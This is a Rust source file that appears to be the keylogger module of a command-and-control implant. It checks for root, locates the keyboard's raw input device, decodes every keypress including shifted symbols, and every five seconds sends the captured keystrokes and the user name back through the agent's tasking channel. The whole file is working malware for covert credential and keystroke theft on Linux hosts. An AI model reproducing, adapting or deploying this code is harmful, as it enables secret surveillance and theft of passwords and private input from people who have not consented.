use crate::structs::{Keylog, Task};
use crate::utils::get_user;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

const EV_KEY: u16 = 0x01;

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct InputEvent {
    tv_sec: i64,
    tv_usec: i64,
    event_type: u16,
    code: u16,
    value: i32,
}

fn key_code_map() -> HashMap<u16, &'static str> {
    let mut m = HashMap::new();
    m.insert(1, "ESC"); m.insert(2, "1"); m.insert(3, "2"); m.insert(4, "3");
    m.insert(5, "4"); m.insert(6, "5"); m.insert(7, "6"); m.insert(8, "7");
    m.insert(9, "8"); m.insert(10, "9"); m.insert(11, "0"); m.insert(12, "-");
    m.insert(13, "="); m.insert(14, "BS"); m.insert(15, "TAB");
    m.insert(16, "Q"); m.insert(17, "W"); m.insert(18, "E"); m.insert(19, "R");
    m.insert(20, "T"); m.insert(21, "Y"); m.insert(22, "U"); m.insert(23, "I");
    m.insert(24, "O"); m.insert(25, "P"); m.insert(26, "["); m.insert(27, "]");
    m.insert(28, "ENTER"); m.insert(29, "L_CTRL");
    m.insert(30, "A"); m.insert(31, "S"); m.insert(32, "D"); m.insert(33, "F");
    m.insert(34, "G"); m.insert(35, "H"); m.insert(36, "J"); m.insert(37, "K");
    m.insert(38, "L"); m.insert(39, ";"); m.insert(40, "'"); m.insert(41, "`");
    m.insert(42, "L_SHIFT"); m.insert(43, "\\");
    m.insert(44, "Z"); m.insert(45, "X"); m.insert(46, "C"); m.insert(47, "V");
    m.insert(48, "B"); m.insert(49, "N"); m.insert(50, "M");
    m.insert(51, ","); m.insert(52, "."); m.insert(53, "/");
    m.insert(54, "R_SHIFT"); m.insert(55, "*"); m.insert(56, "L_ALT");
    m.insert(57, "SPACE"); m.insert(58, "CAPS_LOCK");
    m.insert(59, "F1"); m.insert(60, "F2"); m.insert(61, "F3"); m.insert(62, "F4");
    m.insert(63, "F5"); m.insert(64, "F6"); m.insert(65, "F7"); m.insert(66, "F8");
    m.insert(67, "F9"); m.insert(68, "F10");
    m.insert(87, "F11"); m.insert(88, "F12");
    m.insert(96, "R_ENTER"); m.insert(97, "R_CTRL"); m.insert(100, "R_ALT");
    m.insert(102, "Home"); m.insert(103, "Up"); m.insert(104, "PgUp");
    m.insert(105, "Left"); m.insert(106, "Right"); m.insert(107, "End");
    m.insert(108, "Down"); m.insert(109, "PgDn"); m.insert(110, "Insert");
    m.insert(111, "Del");
    m
}

fn shift_map() -> HashMap<&'static str, &'static str> {
    let mut m = HashMap::new();
    m.insert("1", "!"); m.insert("2", "@"); m.insert("3", "#"); m.insert("4", "$");
    m.insert("5", "%"); m.insert("6", "^"); m.insert("7", "&"); m.insert("8", "*");
    m.insert("9", "("); m.insert("0", ")"); m.insert("-", "_"); m.insert("=", "+");
    m.insert("[", "{"); m.insert("]", "}"); m.insert("\\", "|"); m.insert(";", ":");
    m.insert("'", "\""); m.insert(",", "<"); m.insert(".", ">"); m.insert("/", "?");
    m.insert("`", "~");
    m
}

fn find_keyboard_device() -> Option<String> {
    for i in 0..255 {
        let path = format!("/sys/class/input/event{}/device/name", i);
        if let Ok(name) = std::fs::read_to_string(&path) {
            if name.to_lowercase().contains("keyboard") {
                return Some(format!("/dev/input/event{}", i));
            }
        }
    }
    None
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    // Check if root
    if unsafe { libc::getuid() } != 0 {
        response.set_error("Keylogger requires root privileges");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    let keyboard_path = match find_keyboard_device() {
        Some(p) => p,
        None => {
            response.set_error("No keyboard device found");
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let fd = match std::fs::File::open(&keyboard_path) {
        Ok(f) => f,
        Err(e) => {
            response.set_error(&format!("Failed to open {}: {}", keyboard_path, e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    response.user_output = "Started keylogger.".to_string();
    let _ = task.job.send_responses.send(response).await;

    let keystrokes = Arc::new(Mutex::new(String::new()));
    let keystrokes_clone = keystrokes.clone();
    let send_responses = task.job.send_responses.clone();
    let task_id = task.data.task_id.clone();
    let user = get_user();

    // Keystroke collection thread
    let stop_ref = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let stop_ref2 = stop_ref.clone();

    std::thread::spawn(move || {
        use std::io::Read;
        let key_map = key_code_map();
        let s_map = shift_map();
        let mut shift = false;
        let mut capslock = false;
        let event_size = std::mem::size_of::<InputEvent>();
        let mut buf = vec![0u8; event_size];
        let mut reader = std::io::BufReader::new(fd);

        loop {
            if stop_ref2.load(std::sync::atomic::Ordering::Relaxed) {
                break;
            }
            match reader.read_exact(&mut buf) {
                Ok(_) => {
                    let event: InputEvent = unsafe { std::ptr::read(buf.as_ptr() as *const InputEvent) };
                    if event.event_type == EV_KEY && event.value == 1 {
                        // Key press
                        if let Some(&key) = key_map.get(&event.code) {
                            let mut ks = keystrokes_clone.lock().unwrap();
                            match key {
                                "L_SHIFT" | "R_SHIFT" => shift = true,
                                "CAPS_LOCK" => capslock = !capslock,
                                "SPACE" => ks.push(' '),
                                "ENTER" => ks.push('\n'),
                                _ => {
                                    if key.len() > 1 && key != "L_SHIFT" && key != "R_SHIFT" {
                                        ks.push_str(&format!("[{}]", key));
                                    } else if shift {
                                        if key.chars().all(|c| c.is_alphabetic()) {
                                            ks.push_str(key);
                                        } else if let Some(&shifted) = s_map.get(key.to_lowercase().as_str()) {
                                            ks.push_str(shifted);
                                        }
                                    } else if capslock {
                                        ks.push_str(key);
                                    } else {
                                        ks.push_str(&key.to_lowercase());
                                    }
                                }
                            }
                        }
                    } else if event.event_type == EV_KEY && event.value == 0 {
                        if let Some(&key) = key_map.get(&event.code) {
                            if key == "L_SHIFT" || key == "R_SHIFT" {
                                shift = false;
                            }
                        }
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Flush keystrokes every 5 seconds
    loop {
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;

        if task.should_stop() {
            stop_ref.store(true, std::sync::atomic::Ordering::Relaxed);
            break;
        }

        let captured = {
            let mut ks = keystrokes.lock().unwrap();
            if ks.is_empty() {
                None
            } else {
                let c = ks.clone();
                ks.clear();
                Some(c)
            }
        };

        if let Some(captured) = captured {
            let mut msg = crate::structs::Response {
                task_id: task_id.clone(),
                ..Default::default()
            };
            msg.keylogs = Some(vec![Keylog {
                user: user.clone(),
                window_title: String::new(),
                keystrokes: captured,
            }]);
            let _ = send_responses.send(msg).await;
        }
    }

    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
